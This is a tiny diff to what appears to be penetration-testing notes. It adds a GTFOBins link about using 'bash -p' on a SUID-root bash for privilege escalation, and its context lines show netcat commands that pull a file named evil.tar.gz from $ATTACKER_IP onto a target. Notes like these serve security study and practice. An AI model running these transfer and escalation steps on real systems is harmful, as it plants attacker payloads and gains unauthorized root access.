@@ -67,3 +67,7 @@ nc -lvnp 4449 < evil.tar.gz
 # On target
 nc $ATTACKER_IP 4449 > evil.tar.gz
 ```
+
+## Resources
+
+- [GTFOBins bash](https://gtfobins.github.io/gtfobins/bash/) — `bash -p` when the binary is SUID root
